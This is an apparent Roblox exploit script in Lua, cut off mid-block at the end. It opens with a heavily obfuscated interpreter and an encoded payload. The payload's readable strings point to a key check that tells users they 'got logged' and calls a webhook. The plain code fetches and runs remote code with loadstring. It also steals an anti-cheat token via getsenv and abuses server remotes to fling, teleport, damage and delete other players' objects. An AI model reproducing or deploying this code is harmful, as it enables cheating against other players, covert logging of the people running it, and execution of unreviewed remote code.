                                                                (((1238 + 1276) < ((7577 + 910) - 4093)) and
                                                                    (v151 == (2 - 1)))
                                                             then
                                                                while true do
                                                                    if
                                                                        ((v152 == (0 + 0)) or
                                                                            ((447 + 1221) == (5011 - (420 + 736 + 482))))
                                                                     then
                                                                        v153 = v82[477 - ((1160 - (566 + 345)) + 226)]
                                                                        do
                                                                            return v12(v80, v153, v69)
                                                                        end
                                                                        break
                                                                    end
                                                                end
                                                                break
                                                            end
                                                            if ((0 == v151) or ((3958 - (200 + 264)) > (15215 - 11287))) then
                                                                v152 = (636 - (165 + 471)) + 0
                                                                v153 = nil
                                                                v151 = 1 + 0
                                                            end
                                                        end
                                                    else
                                                        local v154 = 0 + 0 + 0
                                                        local v155
                                                        local v156
                                                        while true do
                                                            if (((4012 - 2178) == (2805 - 971)) and (v154 == 0)) then
                                                                v155 = 0 - 0
                                                                v156 = nil
                                                                v154 = 1
                                                            end
                                                            if
                                                                (((2133 - (1210 + 29 + 91)) <= (1510 + 96 + 1131)) and
                                                                    (v154 == (3 - (5 - 3))))
                                                             then
                                                                while true do
                                                                    if
                                                                        (((99 - (15 + 84)) == v155) or
                                                                            ((5232 - (472 + (1089 - (149 + 7)))) <=
                                                                                ((365 - (143 + 4)) - 83)))
                                                                     then
                                                                        v156 = v82[1 + (2 - 1)]
                                                                        v80[v156] =
                                                                            v80[v156](
                                                                            v12(v80, v156 + (1166 - (1128 + 37)), v69)
                                                                        )
                                                                        break
                                                                    end
                                                                end
                                                                break
                                                            end
                                                        end
                                                    end
                                                elseif (((4103 + 238) >= (5562 - (22 + 1606))) and (v83 == (3 + 16))) then
                                                    v80[v82[1600 - (748 + 850)]] = v80[v82[4 - 1]] * v82[7 - (6 - 3)]
                                                else
                                                    local v158 = 286 - (133 + 153)
                                                    local v159
                                                    local v160
                                                    local v161
                                                    while true do
                                                        if (((1696 + 1581) > 2519) and (v158 == (0 - 0))) then
                                                            v159 = 0 + 0
                                                            v160 = nil
                                                            v158 = 1 - 0
                                                        end
                                                        if
                                                            ((v158 == (1 + 0)) or
                                                                (((1845 - 1008) + (12270 - 9154)) <= (6561 - 4377)))
                                                         then
                                                            v161 = nil
                                                            while true do
                                                                if
                                                                    ((((833 - (432 + 400)) + 0) == v159) or
                                                                        ((20 + 2) > (1511 + 3048)))
                                                                 then
                                                                    v80[v160 + (1 - 0)] = v161
                                                                    v80[v160] = v161[v82[11 - 7]]
                                                                    break
                                                                end
                                                                if
                                                                    (((1556 + 824) < (8033 - 4082)) and
                                                                        (v159 ==
                                                                            ((1630 - 876) - ((741 - (437 + 61)) + 511))))
                                                                 then
                                                                    local v212 = 0 + 0
                                                                    while true do
                                                                        if
                                                                            ((v212 == (1 + 0)) or
                                                                                (4462 == (4423 - (883 + 13))))
                                                                         then
                                                                            v159 = 1 + 0
                                                                            break
                                                                        end
                                                                        if
                                                                            ((v212 == (1368 - (494 + 874))) or
                                                                                ((4730 - (898 + 1007)) >=
                                                                                    (15448 - 10863)))
                                                                         then
                                                                            v160 = v82[866 - (91 + (2318 - 1545))]
                                                                            v161 = v80[v82[3 + 0]]
                                                                            v212 = 1
                                                                        end
                                                                    end
                                                                end
                                                            end
                                                            break
                                                        end
                                                    end
                                                end
                                            elseif (((3620 - (1379 + 5)) == (1499 + 737)) and (v83 <= (56 - 34))) then
                                                if ((v83 == (55 - 34)) or ((355 + 146) > (4520 - (4 + 34 + 43)))) then
                                                    local v162 = 0 - 0
                                                    local v163
                                                    local v164
                                                    local v165
                                                    local v166
                                                    local v167
                                                    while true do
                                                        if
                                                            (((1895 - (574 + 312)) <= (424 + 4395)) and
                                                                ((493 - (23 + 470)) == v162))
                                                         then
                                                            v163 = 1938 - ((2794 - 1419) + 563)
                                                            v164 = nil
                                                            v162 = 61 - (29 + (85 - 54))
                                                        end
                                                        if ((v162 == (4 - (2 + 0))) or ((5886 - 1737) <= (7524 - 5481))) then
                                                            v167 = nil
                                                            while true do
                                                                if
                                                                    (((3696 - (331 + (1213 - 865))) < 4590) and
                                                                        (v163 == (0 + 0)))
                                                                 then
                                                                    v164 = v82[(6 + 2) - 6]
                                                                    v165, v166 =
                                                                        v77(v80[v164](v80[v164 + (187 - (183 + 3))]))
                                                                    v163 = 1638 - (247 + 1390)
                                                                end
                                                                if
                                                                    ((((11487 - 7581) + 962) >= (12869 - 8425)) and
                                                                        (v163 == (1690 - (584 + 1105))))
                                                                 then
                                                                    v69 = (v166 + v164) - (1 + 0)
                                                                    v167 = 0 + 0 + 0
                                                                    v163 = 2 - 0
                                                                end
                                                                if
                                                                    ((v163 == ((361 - (94 + 218)) - (38 + 9))) or
                                                                        ((2006 - (259 + 742)) >= (668 + 816)))
                                                                 then
                                                                    for v221 = v164, v69 do
                                                                        local v222 = (2653 - 1489) - (670 + 494)
                                                                        local v223
                                                                        while true do
                                                                            if
                                                                                ((v222 == (0 + 0)) or
                                                                                    (3837 <= (5505 - (1057 + 818))))
                                                                             then
                                                                                v223 = 701 - (607 + 94)
                                                                                while true do
                                                                                    if
                                                                                        ((v223 ==
                                                                                            ((2908 - (483 + 680)) -
                                                                                                (97 + 1648))) or
                                                                                            ((8006 - 4754) >=
                                                                                                (4785 - 1413)))
                                                                                     then
                                                                                        v167 = v167 + 1
                                                                                        v80[v221] = v165[v167]
                                                                                        break
                                                                                    end
                                                                                end
                                                                                break
                                                                            end
                                                                        end
                                                                    end
                                                                    break
                                                                end
                                                            end
                                                            break
                                                        end
                                                        if
                                                            ((v162 == (2 - 1)) or
                                                                ((385 + 1397) == (1657 - (256 + 316 + 494))))
                                                         then
                                                            v165 = nil
                                                            v166 = nil
                                                            v162 = 302 - (18 + (368 - 86))
                                                        end
                                                    end
                                                else
                                                    v80[v82[1609 - (773 + 834)]]()
                                                end
                                            elseif
                                                (((4492 - (400 + 578)) == ((6920 - 5422) + 2016)) and (v83 <= (21 + 2)))
                                             then
                                                v68 = v82[400 - (112 + 285)]
                                            elseif
                                                ((v83 > (391 - (222 + 145))) or
                                                    ((1668 + 331) == (2003 - ((1256 - (847 + 368)) + 997))))
                                             then
                                                v80[v82[2 + (1661 - (280 + 1381))]] = v80[v82[7 - 4]]
                                            else
                                                v80[v82[4 - 2]] = #v80[v82[10 - 7]]
                                            end
                                        elseif (((4217 - (111 + 61)) > (2829 + 553)) and (v83 <= ((14 - 3) + 18))) then
                                            if ((v83 <= (68 - 41)) or (((14865 - (1069 + 400)) - 8522) < (3029 + 1362))) then
                                                if ((v83 == 26) or ((6733 - 5343) >= (561 + 2420))) then
                                                    local v168 = 1178 - (1101 + 77)
                                                    local v169
                                                    local v170
                                                    local v171
                                                    while true do
                                                        if ((v168 == 1) or ((521 + 2596) == (8735 - 3805))) then
                                                            v171 = nil
                                                            while true do
                                                                if
                                                                    ((v169 == (0 + 0)) or
                                                                        ((4272 - 3051) >= (2973 + 1485)))
                                                                 then
                                                                    local v213 = 0 - 0
                                                                    while true do
                                                                        if
                                                                            ((((4245 + 1047) - (3152 - (144 + 285))) ==
                                                                                ((7281 - (620 + 846)) - 3246)) and
                                                                                (v213 == (1 + 0)))
                                                                         then
                                                                            v169 = 1 - 0
                                                                            break
                                                                        end
                                                                        if
                                                                            (((7291 - 3431) > (10927 - 8478)) and
                                                                                (v213 == (0 + 0)))
                                                                         then
                                                                            v170 = 0 + 0
                                                                            v171 = nil
                                                                            v213 = 1 + 0
                                                                        end
                                                                    end
                                                                end
                                                                if (((6657 - 4427) == (1328 + 902)) and (1 == v169)) then
                                                                    while true do
                                                                        if
                                                                            ((v170 == (1576 - (1052 + 524))) or
                                                                                (((5291 - (1383 + 87)) - (1014 + 453)) <
                                                                                    (1691 - 697)))
                                                                         then
                                                                            v171 = v82[2 - 0]
                                                                            v80[v171] =
                                                                                v80[v171](
                                                                                v12(
                                                                                    v80,
                                                                                    v171 + (1786 - (304 + 1481)),
                                                                                    v82[2 + 1]
                                                                                )
                                                                            )
                                                                            break
                                                                        end
                                                                    end
                                                                    break
                                                                end
                                                            end
                                                            break
                                                        end
                                                        if
                                                            ((v168 == (0 + 0)) or
                                                                ((1881 - (108 + 3)) < (802 - (2338 - (719 + 1153)))))
                                                         then
                                                            v169 = 0 + 0
                                                            v170 = nil
                                                            v168 = 4 - 3
                                                        end
                                                    end
                                                else
                                                    local v172 = 0 - 0
                                                    local v173
                                                    local v174
                                                    while true do
                                                        if
                                                            (((3 - 2) == v172) or
                                                                ((4 + (2044 - 1232)) < (1470 - (817 + 368))))
                                                         then
                                                            while true do
                                                                if
                                                                    ((v173 == (884 - (8 + 876))) or
                                                                        ((541 + (3044 - (1139 + 721))) >=
                                                                            (4204 - (1000 + 998))))
                                                                 then
                                                                    v174 = v82[2]
                                                                    v80[v174] =
                                                                        v80[v174](v80[v174 + (1067 - (1003 + 63))])
                                                                    break
                                                                end
                                                            end
                                                            break
                                                        end
                                                        if
                                                            ((v172 == (0 - 0)) or
                                                                ((4972 - (1430 + 409)) <= (1981 - (26 + 12))))
                                                         then
                                                            v173 = 470 - (46 + 424)
                                                            v174 = nil
                                                            v172 = 1 + 0
                                                        end
                                                    end
                                                end
                                            elseif ((v83 == 28) or ((17 + 74) > (4219 - (458 + 23 + 1461)))) then
                                                do
                                                    return
                                                end
                                            else
                                                for v185 = v82[2], v82[4 - 1] do
                                                    v80[v185] = nil
                                                end
                                            end
                                        elseif ((v83 <= 31) or ((4515 - ((2256 - 1758) + 652)) <= (4410 - (912 + 593)))) then
                                            if ((v83 == (13 + 17 + 0)) or ((857 - (554 + 244)) >= (4401 - (975 + 62)))) then
                                                local v175 = 424 - (117 + 307)
                                                local v176
                                                local v177
                                                local v178
                                                local v179
                                                while true do
                                                    if
                                                        (((3154 - (201 + 1052 + 521)) == (404 + 976)) and
                                                            ((4 - 3) == v175))
                                                     then
                                                        v178 = nil
                                                        v179 = nil
                                                        v175 = 4 - 2
                                                    end
                                                    if
                                                        ((v175 == ((1220 - (368 + 846)) - 4)) or
                                                            ((11891 - 7838) <= (5345 - 2796)))
                                                     then
                                                        while true do
                                                            if ((v176 == 1) or (1621 >= (1350 + (955 - 435)))) then
                                                                v179 = v80[v177 + 2 + 0 + 0]
                                                                if ((v179 > (0 + 0)) or ((8272 - 4606) == 618)) then
                                                                    if
                                                                        (((595 + 252 + 686) < (5748 - (179 + 886))) and
                                                                            (v178 > v80[v177 + (1246 - (492 + 753))]))
                                                                     then
                                                                        v68 = v82[708 - (231 + 474)]
                                                                    else
                                                                        v80[v177 + (1495 - (58 + 1434))] = v178
                                                                    end
                                                                elseif
                                                                    (((2862 - ((1750 - (1037 + 390)) + 436)) >=
                                                                        (1479 - ((856 - (150 + 189)) + 4))) and
                                                                        (v178 < v80[v177 + (2 - 1)]))
                                                                 then
                                                                    v68 = v82[862 - (448 + 411)]
                                                                else
                                                                    v80[v177 + (11 - 8)] = v178
                                                                end
                                                                break
                                                            end
                                                            if
                                                                (((2335 - (334 + 738)) <= (4909 - (1687 + 237))) and
                                                                    (v176 == (19 - (14 + 5))))
                                                             then
                                                                local v215 = 1890 - (1317 + 573)
                                                                while true do
                                                                    if
                                                                        ((v215 == ((3 - 2) + 0)) or
                                                                            ((5363 - (475 + 63)) < (277 + 552)))
                                                                     then
                                                                        v176 = 1 + 0
                                                                        break
                                                                    end
                                                                    if
                                                                        ((v215 == (0 + (1190 - (728 + 462)))) or
                                                                            (((5056 - (58 + 585)) - 1691) ==
                                                                                ((1771 + 2772) - (1560 + 329))))
                                                                     then
                                                                        v177 = v82[1020 - (594 + 424)]
                                                                        v178 = v80[v177]
                                                                        v215 = 1 + 0
                                                                    end
                                                                end
                                                            end
                                                        end
                                                        break
                                                    end
                                                    if (((1267 - (829 + 132)) < (144 + 3033)) and (v175 == (0 + 0))) then
                                                        v176 = 0 + 0
                                                        v177 = nil
                                                        v175 = 1240 - (187 + 1052)
                                                    end
                                                end
                                            else
                                                v80[v82[1 + 1]] = v80[v82[5 - 2]][v82[1296 - (931 + 361)]]
                                            end
                                        elseif ((v83 <= (47 - 15)) or (289 >= (2041 - (652 + 933)))) then
                                            local v181 = 0 + 0
                                            local v182
                                            local v183
                                            local v184
                                            while true do
                                                if ((v181 == (0 - 0)) or ((4484 - (616 + 442)) < (3342 - 2120))) then
                                                    v182 = v82[2 + 0]
                                                    v183 = {v80[v182](v80[v182 + (2 - 1)])}
                                                    v181 = 1 + (1054 - (275 + 779))
                                                end
                                                if (((7930 - 4697) == (6449 - 3216)) and (v181 == ((9 - 6) - 2))) then
                                                    v184 = 0 - 0
                                                    for v199 = v182, v82[4 + 0] do
                                                        local v200 = 1149 - ((647 - (109 + 519)) + 1130)
                                                        local v201
                                                        while true do
                                                            if (((3263 + 26) >= (6892 - 5172)) and (v200 == (0 - 0))) then
                                                                v201 = 1190 - (436 + 754)
                                                                while true do
                                                                    if
                                                                        ((v201 == (0 + 0)) or
                                                                            ((1392 - (776 + 269)) > (976 + 1222)))
                                                                     then
                                                                        v184 = v184 + (2 - 1)
                                                                        v80[v199] = v183[v184]
                                                                        break
                                                                    end
                                                                end
                                                                break
                                                            end
                                                        end
                                                    end
                                                    break
                                                end
                                            end
                                        elseif
                                            (((4316 + 674) > (4695 - (36 + 8 + 182))) and (v83 == (1710 - (796 + 881))))
                                         then
                                            local v191 = 0
                                            local v192
                                            local v193
                                            while true do
                                                if (((0 - 0) == v191) or (605 >= ((4575 - (18 + 90)) - (663 + 924)))) then
                                                    v192 = 1198 - (193 + 1005)
                                                    v193 = nil
                                                    v191 = (1 + 0) - 0
                                                end
                                                if ((v191 == (1126 - (486 + 639))) or ((851 + 3286) < (1115 + 148))) then
                                                    while true do
                                                        if
                                                            (((2718 - (691 + 66)) > (6449 - 5080)) and
                                                                (v192 == (937 - (310 + 627))))
                                                         then
                                                            v193 = v82[2 - 0]
                                                            do
                                                                return v12(v80, v193, v193 + v82[1480 - (625 + 852)])
                                                            end
                                                            break
                                                        end
                                                    end
                                                    break
                                                end
                                            end
                                        else
                                            do
                                                return v80[v82[2]]
                                            end
                                        end
                                        v68 = v68 + (2 - 1)
                                        break
                                    end
                                end
                                break
                            end
                        end
                    end
                end
                A, B = v26(v10(v72))
                if not A[1] then
                    local v84 = v34[4][v68] or "?"
                    error("Script error at [" .. v84 .. "]:" .. A[2])
                else
                    return v12(A, 2, B)
                end
            end
        end
        return v28(v27(), {}, v16)()
    end
    v14(
        "LOL!0C3O00028O0003023O005F472O033O004B4559026O00F03F03043O0067616D6503073O00506C6179657273030B3O004C6F63616C506C6179657203043O004E616D6503043O004B69636B036D3O00696E76616C6964206B65792C20286F6820616E642C20796F7520676F74206C6F2O676564292061736B20726F677565232O32353720286F7220742O6F6B5F6D7974696D6520696E2D67616D652920666F7220612070726F706572206B657920666F7220796F7520746F20757365030F3O0072656D6F766577686974656C69737403083O0073656E64682O6F6B003B3O0012033O00014O001D000100023O00260B3O000B000100010004173O000B000100020E00016O0019000300013O001205000400023O00201F0004000400032O001B0003000200022O0019000200033O0012033O00043O00260B3O0002000100040004173O00020001001205000300053O00201F00030003000600201F00030003000700201F00030003000800060A0002003A000100030004173O003A0001001203000300014O001D000400043O00260B00030015000100010004173O00150001001203000400013O001203000500013O00260B00050019000100010004173O0019000100260B00040024000100040004173O00240001001205000600053O00201F00060006000600201F0006000600070020140006000600090012030008000A4O0006000600084O001100065O000E0800010018000100040004173O00180001001203000600013O000E080001002E000100060004173O002E00010012050007000B4O00160007000100010012050007000C4O0016000700010001001203000600043O000E0800040027000100060004173O00270001001203000400043O0004173O001800010004173O002700010004173O001800010004173O001900010004173O001800010004173O003A00010004173O001500010004173O003A00010004173O000200012O001C3O00013O00013O00173O00028O00026O00F03F027O0040026O001040026O000840034O0003053O00706169727303063O00737472696E6703043O006368617203043O006D61746803043O006365696C03083O00746F6E756D626572029A5O9905402O033O0073756203013O007C03053O007461626C6503063O00696E73657274026O00204003043O006773756203023O007D5F026O001C4003073O00726F6775655F7B030F3O006E6F7420612076616C6964206B6579018C3O001203000100014O001D000200063O000E0800020006000100010004173O000600012O001D000400053O001203000100033O00260B0001000B000100010004173O000B0001001203000200014O001D000300033O001203000100023O00260B00010002000100030004173O000200012O001D000600063O001203000700013O00260B0007002C000100010004173O002C000100260B00020014000100040004173O001400012O0022000600023O000E080005002B000100020004173O002B0001001203000600063O001205000800074O0019000900044O002000080002000A0004173O002800012O0019000D00063O001205000E00083O00201F000E000E0009001205000F000A3O00201F000F000F000B0012050010000C4O00190011000C4O001B00100002000200201000100010000D0020130010001000032O0015000F00104O0012000E3O00022O00040006000D000E0006070008001B000100020004173O001B0001001203000200043O001203000700023O00260B00070069000100020004173O0069000100260B00020053000100030004173O00530001001203000800013O000E0800020035000100080004173O00350001001203000200053O0004173O0053000100260B00080031000100010004173O00310001001203000500013O001203000900024O0018000A00033O001203000B00023O00041E000900510001002014000D0003000E2O0019000F000C4O00190010000C4O001A000D0010000200260B000D00500001000F0004173O00500001001203000D00013O000E08000100430001000D0004173O00430001001205000E00103O00201F000E000E00112O0019000F00043O00201400100003000E0020010012000500020020090013000C00022O0002001000134O000C000E3O00012O00190005000C3O0004173O005000010004173O0043000100040D0009003C0001001203000800023O0004173O0031000100260B00020068000100020004173O00680001001203000800013O00260B0008005A000100020004173O005A0001001203000200033O0004173O00680001000E0800010056000100080004173O0056000100201400093O000E001203000B00124O001A0009000B0002002014000900090013001203000B00143O001203000C00064O001A0009000C00022O0019000300096O00096O0019000400093O001203000800023O0004173O00560001001203000700033O000E080003000F000100070004173O000F000100260B0002000E000100010004173O000E0001001203000800013O00260B00080072000100020004173O00720001001203000200023O0004173O000E000100260B0008006E000100010004173O006E000100201400093O000E001203000B00023O001203000C00154O001A0009000C000200260F0009007C000100160004173O007C0001001203000900174O0022000900023O00201400093O000E2O0018000B5O002009000B000B00022O001A0009000B000200260F00090084000100140004173O00840001001203000900174O0022000900023O001203000800023O0004173O006E00010004173O000E00010004173O000F00010004173O000E00010004173O008B00010004173O000200012O001C3O00017O008C3O00083O00093O000F3O000F3O00103O00123O00143O00143O00153O00163O00173O00193O00193O001A3O001C3O001E3O001E3O001F3O001F3O00203O00223O00223O00233O00243O00243O00243O00243O00253O00253O00253O00253O00253O00253O00253O00253O00253O00253O00253O00253O00253O00243O00253O00273O00293O002B3O002B3O002C3O002C3O002D3O002F3O002F3O00303O00313O00333O00333O00343O00353O00353O00353O00353O00363O00363O00363O00363O00363O00363O00373O00393O00393O003A3O003A3O003A3O003A3O003A3O003A3O003A3O003A3O003B3O003C3O003D3O00353O00413O00423O00453O00453O00463O00483O00483O00493O004A3O004C3O004C3O004D3O004D3O004D3O004D3O004D3O004D3O004D3O004D3O004E3O004E3O004F3O00503O00533O00553O00553O00563O00563O00573O00593O00593O005A3O005B3O005D3O005D3O005E3O005E3O005E3O005E3O005E3O005E3O005F3O005F3O00613O00613O00613O00613O00613O00613O00623O00623O00643O00653O00683O00693O006A3O006C3O006D3O006F3O003B3O00023O00033O00063O00063O00073O00703O00703O00703O00703O00703O00713O00733O00733O00743O00743O00743O00743O00743O00743O00753O00763O00783O00783O00793O007B3O007D3O007D3O007E3O007E3O007F3O007F3O007F3O007F3O007F3O007F3O007F3O00813O00813O00823O00843O00843O00853O00853O00863O00863O00873O00893O00893O008A3O008B3O008C3O008F3O00903O00913O00933O00943O00973O00983O009A3O00",
        v8()
    )
end

local IMPORTANT = game.ReplicatedStorage.Part
local classname = "firecrackerminigun"
local pass = getsenv(game.Players.LocalPlayer.PlayerGui.LocalProjectile).pass
local plr = game:GetService("Players").LocalPlayer
local charr = plr.Character
local hum = charr.Humanoid
local rt = hum.RootPart
local name = plr.Name
local a
local notification =
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Kaiddd/notificationstuff/main/src.lua", true))()
local function notify(title, duration)
    notification(
        {
            Text = title,
            Duration = duration
        }
    )
end

local dec = function(sc)
	if sc:sub(1, 7) ~= 'rogue_{' then 
		return 'not a valid key'
	end

	if sc:sub(#sc - 1) ~= '}_' then 
		return 'not a valid key'
	end 

	local new = sc:sub(8):gsub('}_', '')
	local parts = {}

	local last = 0 

	for i = 1,#new do 
		if new:sub(i, i) == '|' then 
			table.insert(parts, new:sub(last + 1, i - 1))
			last = i 
		end
	end

	local str = ''
	for i, v in pairs(parts) do 
		str = str .. string.char(math.ceil((tonumber(v) / 2.7) * 2))
	end


	return str
end
function getpass()
    return pass
end

function fling(plr, ty, pwr, pwr2)
    pass = getpass()

    game.ReplicatedStorage.Remotes.EffectApply:InvokeServer(pass(), plr, ty, plr.Head, pwr, pwr2)
end

function tp(plr, cf)
    pass = getpass()
    local args = {
        [1] = pass(),
        [2] = plr,
        [3] = "SafeTeleport",
        [4] = cf
    }
    game:GetService("ReplicatedStorage").Remotes.EffectApply:InvokeServer(unpack(args))
end

function ok(part, pathh)
    pcall(
        function()
            pass = getpass()
            local args = {
                [1] = pass(),
                [2] = game.Workspace.NormalDummy3,
                [3] = part,
                [4] = pathh
            }

            game:GetService("ReplicatedStorage").Remotes.EffectApply:InvokeServer(unpack(args))
        end
    )
end

function del(part)
    ok(game.ReplicatedStorage.Effects.StealthWarning.Effect, part)
end

local function GetClosest()
    LocalPlayer = game.Players.LocalPlayer
    local Character = LocalPlayer.Character
    local HumanoidRootPart = Character and Character:FindFirstChild("HumanoidRootPart")
    if not (Character or HumanoidRootPart) then
        return
    end

    local TargetDistance = math.huge
    local team
    if workspace[LocalPlayer.Name]:FindFirstChild("Red") then
        team = "Red"
    elseif workspace[LocalPlayer.Name]:FindFirstChild("Blue") then
        team = "Blue"
    end
    if team == nil then
        for i, v in ipairs(workspace:GetChildren()) do
            local stats = v:FindFirstChild("Stats")
            if stats then
                local hp = stats:FindFirstChild("CurrentHP")
                if hp.Value > 0 then
                    if
                        v ~= Character and v:FindFirstChild("HumanoidRootPart") and not v.Name:find("ability") and
                            v:FindFirstChild("Playing") or
                            v.Name:find("Dummy") and not v:FindFirstChild("Playing")
                     then
                        local TargetHRP = v:FindFirstChild("HumanoidRootPart")
                        if TargetHRP and HumanoidRootPart then
                            local mag = (HumanoidRootPart.Position - TargetHRP.Position).magnitude
                            if mag < TargetDistance then
                                TargetDistance = mag
                                Target = v
                            end
                        end
                    end
                end
            end
        end
    else
        for i, v in ipairs(workspace:GetChildren()) do
            local stats = v:FindFirstChild("Stats")
            if stats then
                local hp = stats:FindFirstChild("CurrentHP")
                if hp.Value > 0 then
                    if
                        v ~= Character and v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Playing") and
                            not v:FindFirstChild(team) or
                            v.Name:find("Dummy")
                     then
                        local TargetHRP = v:FindFirstChild("HumanoidRootPart")
                        if TargetHRP and HumanoidRootPart then
                            local mag = (HumanoidRootPart.Position - TargetHRP.Position).magnitude
                            if mag < TargetDistance then
                                TargetDistance = mag
                                Target = v
                            end
                        end
                    end
                end
            end
        end
    end
    return Target.HumanoidRootPart
end

local roundDecimals = function(num, places)
    places = math.pow(10, places or 0)
    num = num * places

    if num >= 0 then
        num = math.floor(num + 0.5)
    else
        num = math.ceil(num - 0.5)
    end

    return num / places
end
function damage(chara, amount)
    local pass = getpass()
    if pass == nil then
        return
    end
    game.ReplicatedStorage.Remotes.Damage:InvokeServer(pass(), game.Workspace.RealTime.Value, chara, amount)
end
local canatk = true
local canab1 = true
local canab2 = true
local cancrit = true
local ab1inter = false
times = 0
function cooling(move, timee)
    spawn(
        function()
            local nameof
            if move == "atk" then
                canatk = false
                nameof = "Attack"
            elseif move == "ab1" then
                canab1 = false
                nameof = "Ability1"
            elseif move == "ab2" then
                canab2 = false
                nameof = "Ability2"
            elseif move == "crit" then
                cancrit = false
                nameof = "Critical"
            end
            local moves = game:GetService("Players")[name].PlayerGui.ClassGui.MainHUD.Abilites
            moves[nameof].Icon.ImageTransparency = .5
            local timer = timee
            if move ~= "ab1" then
                while true do
                    moves[nameof].CooldownDisplay.Text = roundDecimals(timer, 1)
                    timer = timer - .1
                    if timer <= 0 then
                        moves[nameof].Icon.ImageTransparency = 0
                        moves[nameof].CooldownDisplay.Text = ""
                        if move == "atk" then
                            canatk = true
                        elseif move == "ab1" then
                            canab1 = true
                        elseif move == "ab2" then
                            canab2 = true
                        elseif move == "crit" then
                            cancrit = true
                        end
                        break
                    end
                    task.wait(.1)
                end
            else
                if times < 2 then
                    if ab1inter then
                        while true do
                            if not ab1inter and times < 2 then
                                break
                            end
                            moves[nameof].CooldownDisplay.Text = roundDecimals(timer, 1)
                            timer = timer - .1
                            if timer <= 0 then
                                moves[nameof].Icon.ImageTransparency = 0
                                moves[nameof].CooldownDisplay.Text = ""
                                if move == "atk" then
                                    canatk = true
                                elseif move == "ab1" then
                                    canab1 = true
                                elseif move == "ab2" then
                                    canab2 = true
                                elseif move == "crit" then
                                    cancrit = true
                                end
                                break
                            end
                            task.wait(.1)
                        end
                    else
                        while not ab1inter do
                            if abinter and times < 2 then
                                break
                            end
                            moves[nameof].CooldownDisplay.Text = roundDecimals(timer, 1)
                            timer = timer - .1
                            if timer <= 0 then
                                moves[nameof].Icon.ImageTransparency = 0
                                moves[nameof].CooldownDisplay.Text = ""
                                if move == "atk" then
                                    canatk = true
                                elseif move == "ab1" then
                                    canab1 = true
                                elseif move == "ab2" then
                                    canab2 = true
                                elseif move == "crit" then
                                    cancrit = true
                                end
                                ab1inter = false
                                break
                            end
                            task.wait(.1)
                        end
                    end
                else
                    times = 0
                    timer = 5
                    while true do
                        moves[nameof].CooldownDisplay.Text = roundDecimals(timer, 1)
                        timer = timer - .1
                        if timer <= 0 then
                            moves[nameof].Icon.ImageTransparency = 0
                            moves[nameof].CooldownDisplay.Text = ""
                            if move == "atk" then
                                canatk = true
                            elseif move == "ab1" then
                                canab1 = true
                            elseif move == "ab2" then
                                canab2 = true
                            elseif move == "crit" then
                                cancrit = true
                            end
                            break
                        end
                        task.wait(.1)
                    end
                end
            end
        end
    )
end

local chosen
function yescreateproj(projpath, cf, tobe, dam, col)
    spawn(
        function()
            local l__Remotes__13 = game.ReplicatedStorage.Remotes
            local l__LocalPlayer__2 = game.Players.LocalPlayer
            local l__Character__4 = l__LocalPlayer__2.Character
            local l__ability2b__41 = projpath
            local v42 = cf
            local v43 = l__ability2b__41:Clone()
            v43.Owner.Value = l__LocalPlayer__2
            v43.Origin.Value = v42.p
            v43.CFrame = v42
            v43.Color = col or l__LocalPlayer__2.CharacterColors.WeaponColor.Value
            v43.Speed.Value = v43.Speed.Value
            v43.Damage.Value = dam or v43.Damage.Value
            local t = v43.Transparency
            for _, v in pairs(v43:GetChildren()) do
                if v.Name == "ProjectileHandler" then
                    local l__ProjectileHandler__44 = v
                    v.Projectile.Value = v43
                    v.Parent = l__Character__4
                    if v43.Name == "ability2b" then
                        v.Disabled = true
                    end
                end
            end
            if v43.Name == "ability2b" then
                chosen = v43
            end
            v43.Parent = workspace
            l__Remotes__13.Projectile:FireServer(
                l__ability2b__41,
                v42,
                col or l__LocalPlayer__2.CharacterColors.WeaponColor.Value
            )
            spawn(
                function()
                    if tobe then
                        local oldcf = v43.CFrame
                        local oldpos
                        task.wait()
                        repeat
                            oldcf = v43.CFrame
                            task.wait()
                        until v43.Parent == nil or t ~= v43.Transparency
                        tobe(oldcf)
                    end
                end
            )
        end
    )
end

function nocreateproj(projpath, cf, mag, dam)
    local l__Remotes__13 = game.ReplicatedStorage.Remotes
    local l__LocalPlayer__2 = game.Players[name]
    local l__Character__4 = l__LocalPlayer__2.Character
    local l__ability2b__41 = projpath
    local v42 = cf
    local v43 = l__ability2b__41:Clone()
    v43.Owner.Value = l__LocalPlayer__2
    v43.Origin.Value = v42.p
    v43.CFrame = v42
    v43.Color = l__LocalPlayer__2.CharacterColors.WeaponColor.Value
    v43.Speed.Value = v43.Speed.Value
    local l__ProjectileHandler__44 = v43.ProjectileHandler
    l__ProjectileHandler__44.Projectile.Value = v43
    l__ProjectileHandler__44.Parent = l__Character__4
    v43.Parent = workspace
    l__Remotes__13.Projectile:FireServer(l__ability2b__41, v42, l__LocalPlayer__2.CharacterColors.WeaponColor.Value)
    for _, v in pairs(game.Workspace:GetChildren()) do
        if v:FindFirstChildWhichIsA("Humanoid") then
            spawn(
                function()
                    if v.Name ~= name then
                        if math.abs((v.HumanoidRootPart.Position - v43.Position).Magnitude) <= mag then
                            damage(v, dam)
                        end
                    end
                end
            )
        end
    end
end

function dash(poww)
    spawn(
        function()
            local l__Character__4 = game.Players.LocalPlayer.Character
            local v40 = Instance.new("BodyVelocity")
            v40.MaxForce = Vector3.new(99999999, 0, 99999999)
            v40.Velocity = l__Character__4.HumanoidRootPart.CFrame.lookVector * Vector3.new(poww, 0, poww)
            if l__Character__4.Humanoid.MoveDirection.magnitude == 0 then
                v40.Velocity = l__Character__4.HumanoidRootPart.CFrame.lookVector * poww
            end
            v40.Parent = l__Character__4.HumanoidRootPart
            task.wait(0.2)
            v40:Destroy()
        end
    )
end

function chooseskin(ty)
    pass = getpass()
    local args = {[1] = pass(), [2] = game.Players.LocalPlayer.Character.CurrentClass.Value, [3] = ty}

    game:GetService("ReplicatedStorage").Remotes.ChangeSkin:FireServer(unpack(args))
end

local class = game.ReplicatedStorage.Classes[plr.Character.CurrentClass.Value]
local armorpieces = {
    ["HandleRight"] = game.ReplicatedStorage.Classes.SANTA.MainSkin.HandleRight,
}

local function adjustskin(location)
    for i, v in pairs(armorpieces) do
        if type(v) == "string" then
            ok(game.ReplicatedStorage.Classes[string.upper(v)].MainSkin[i], location)
        else
            ok(v, location)
        end
    end
    for _, v in pairs(class.MainSkin:GetChildren()) do
        if not location:FindFirstChild(v.Name) then
            ok(v, location)
        end
    end
    
end

if not class:FindFirstChild("Part") then
    ok(game.ReplicatedStorage.Part, class)
    local n = class:WaitForChild("Part")
